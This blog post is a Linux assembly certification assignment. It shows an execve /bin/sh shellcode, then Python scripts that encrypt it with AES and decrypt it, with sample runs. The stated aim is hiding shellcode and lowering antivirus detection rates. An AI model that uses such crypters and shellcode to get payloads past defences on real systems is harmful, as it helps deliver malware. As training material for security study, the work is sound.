# SLAE Assignment #7

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online‐courses/securitytube-linux-assembly-expert/

Student ID: SLAE-935

## Assignment

* Create a custom crypter like the one shown in the "crypters" video
* Free to use any existing encryption schema
* Can use any programming language


## Encryption Algorithm

For this task the AES algorithm has been picked up.
As input it's used the execve-stack.nasm shellcode.
Original shellcode that executes /bin/sh:

```
; Filename: execve-nasm.nasm
; Author:  SLAE-935
;
; Purpose: execute /bin/sh

global _start			

section .text

_start:

	xor eax, eax
	push eax

	; PUSH //bin/sh (8 bytes) 
	push 0x68732f2f
	push 0x6e69622f

	mov ebx, esp

	push eax
	mov edx, esp

	push ebx
	mov ecx, esp

	mov al, 11
	int 0x80
```

Converted to opcodes:

```
$ ./compile-execve-stack.sh 
######### NASM #########
[+] Assembling with Nasm ... 
[+] Done!
[+] Linking ...
[+] Done!
[+] Objdump ...
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
```

The final shellcode to use it's the following (we don't add any encoder stub, since the task is focused on encryption, but adding it at this point would help to decrease the detection rate):

```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
```

## Algorithm Explanation

AES is based on a design principle known as a substitution-permutation network, a combination of both substitution and permutation. It operates on blocks of fixed size (128 bits) and the key can be of 128, 192 or 256 bits.
AES operates on a 4 × 4 column-major order matrix of bytes, called state, if the number of blocks in input gets bigger than 32, an additional column is added to the state, up to 256 bits. In practice, the number of bits of the input block is divided by 32, and the quotient specifies the number of columns.

### Encryption
There is an initial step:

* AddRoundKey – every byte of the table is combined with the session key. 

Then many rounds are expected, and in every round, but the latest, the following steps are repeated

* SubBytes: non linear substitution of all bytes, replaced with a specific table
* ShiftRows: bytes are shifted of a certain number of positions depending on the line they belong to.
* MixColumns: a column per time, the bytes are combined with a linear operation.
* AddRoundKey: every byte of the table is combined with the session key.

The number of processing rounds/cycles of the previous steps is 10, with the last step that skips the MixColumns phase.

### Decryption

The decryption phase is not equal to the encryption one, since the steps are reversed. Anyway it's possible to define an inverse cipher which is equivalent to the steps used during the encryption, by using the inverse function of each step and a different session key.

## Encrypter

Here follows the aes encrypter which takes as input the shellcode and the encryption key, it gives as output the encrypted shellcode:

```python
#!/usr/bin/python
# Python AES Crypter
# Author: SLAE-935
#
# Usage: python Enctypt.py 16bytesKey
# Ex: python Encrypt.py AABBCCDDAABBCCDD

import base64, re
from Crypto.Cipher import AES
from Crypto import Random

def encrypt(key):
    shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" # Execve-stack shellcode
    shellcode = shellcode + '\0' * (32 - len(shellcode) % 32)
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return base64.b64encode(iv + cipher.encrypt(shellcode))

if __name__ == "__main__":
    key = raw_input("Please enter encryption Key - 16 bytes \n")
    while (len(key) != 16 ):
        key = raw_input("Please enter encryption Key - 16 bytes \n")
    print encrypt(key)

```

## Decrypter

Here follows the AES decrypter which takes as input the encryption key, it gives as output the original shellcode if the provided key is the one correct one:

```python
#!/usr/bin/python
# Python AES Decrypt
# Author: SLAE-935
#
# Usage: python Decrypt.py 16bytesKey
# Ex: python Decrypt.py AABBCCDDAABBCCDD

import base64, re
from Crypto.Cipher import AES
from Crypto import Random

# key: ABCDEFGHABCDEFGH
def decrypt(key):
    encoded_shellcode = "ScueqVee2XjND7PIhHeUdM4VX1C7+6QMXct+dvZkRqWR2eNJFK70kwpc5bowocy4" # Execve-stack shellcode
    enc = base64.b64decode(encoded_shellcode)
    iv = enc[:16]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    dec_ascii = re.sub('\0*$','', cipher.decrypt(enc[16:]))
    dec_hex = ''
    for x in bytearray(dec_ascii):
        dec_hex += '\\x%02x' % x
    return dec_hex 

if __name__ == "__main__":
    key = raw_input("Please enter encryption Key - 16 bytes \n")
    while (len(key) != 16 ):
        key = raw_input("Please enter encryption Key - 16 bytes \n")
    print decrypt(key)
```

## Proof of execution

Let's encrypt the shellcode with they key ABCDEFGHABCDEFGH:

```
$ python Encrypt.py 
Please enter encryption Key - 16 bytes 
ABCDEFGHABCDEFGH
ScueqVee2XjND7PIhHeUdM4VX1C7+6QMXct+dvZkRqWR2eNJFK70kwpc5bowocy4
```

Let's decrypt the shellcode with they key ABCDEFGHABCDEFGH:

```
$ python Decrypt.py 
Please enter encryption Key - 16 bytes 
ABCDEFGHABCDEFGH
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
```

As visible we have back the original shellcode.